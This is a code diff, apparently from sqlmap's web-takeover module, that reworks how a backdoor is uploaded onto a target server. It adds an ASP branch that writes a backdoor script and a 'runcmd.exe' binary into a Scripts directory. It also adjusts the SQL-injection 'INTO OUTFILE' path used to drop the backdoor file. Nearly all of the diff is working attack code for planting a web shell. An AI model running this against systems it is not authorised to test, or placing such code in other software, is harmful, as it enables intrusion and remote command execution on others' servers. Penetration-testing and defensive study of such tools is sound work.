@@ -23,6 +23,7 @@ Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 
 import os
+import posixpath
 import re
 
 from extra.cloak.cloak import decloak
@@ -86,8 +87,7 @@ class Web:
         return retVal
 
     def __webFileStreamUpload(self, stream, destFileName, directory):
-        stream.seek(0) #rewind
-        
+        stream.seek(0) #rewind        
         if self.webApi in ("php", "asp"):
             multipartParams = {
                                 "upload":    "1",
@@ -109,7 +109,7 @@ class Web:
             return False
 
     def __webFileInject(self, fileContent, fileName, directory):
-        outFile     = normalizePath("%s/%s" % (directory, fileName))
+        outFile     = posixpath.normpath("%s/%s" % (directory, fileName))
         uplQuery    = fileContent.replace("WRITABLE_DIR", directory.replace('/', '\\\\') if kb.os == "Windows" else directory)
         query       = " LIMIT 1 INTO OUTFILE '%s' " % outFile
         query      += "LINES TERMINATED BY 0x%s --" % hexencode(uplQuery)
@@ -197,7 +197,23 @@ class Web:
             infoMsg += "on '%s'" % directory
             logger.info(infoMsg)
             
-            if not self.__webFileStreamUpload(backdoorStream, backdoorName, posixToNtSlashes(directory) if kb.os == "Windows" else directory):
+            if self.webApi == "asp":
+                runcmdName = 'runcmd.exe'
+                runcmdStream = decloakToNamedTemporaryFile(os.path.join(paths.SQLMAP_SHELL_PATH, runcmdName + '_'), runcmdName)
+                scriptsDirectory = "Scripts"
+                backdoorDirectory = "%s..\%s" % (posixToNtSlashes(directory), scriptsDirectory)
+                backdoorContent = backdoorContent.replace("WRITABLE_DIR", backdoorDirectory)
+                backdoorStream.file.truncate()
+                backdoorStream.read()
+                backdoorStream.seek(0)
+                backdoorStream.write(backdoorContent)
+                if self.__webFileStreamUpload(backdoorStream, backdoorName, backdoorDirectory):
+                    self.__webFileStreamUpload(runcmdStream, runcmdName, backdoorDirectory)
+                    self.webBackdoorUrl = "%s/%s/%s" % (self.webBaseUrl.rstrip('/'), scriptsDirectory, backdoorName)
+                    self.webDirectory = directory
+                else:
+                    continue
+            elif not self.__webFileStreamUpload(backdoorStream, backdoorName, posixToNtSlashes(directory) if kb.os == "Windows" else directory):
                 warnMsg  = "backdoor hasn't been successfully uploaded "
                 warnMsg += "with uploader probably because of permission "
                 warnMsg += "issues."
@@ -209,9 +225,9 @@ class Web:
                     self.__webFileInject(backdoorContent, backdoorName, directory)
                 else:
                     continue
-
-            self.webBackdoorUrl = "%s/%s" % (self.webBaseUrl, backdoorName)
-            self.webDirectory = directory
+                self.webBackdoorUrl = "%s/%s" % (self.webBaseUrl, backdoorName)
+                self.webDirectory = directory
+                
             infoMsg  = "the backdoor has probably been successfully "
             infoMsg += "uploaded on '%s', go with your browser " % directory
             infoMsg += "to '%s' and enjoy it!" % self.webBackdoorUrl
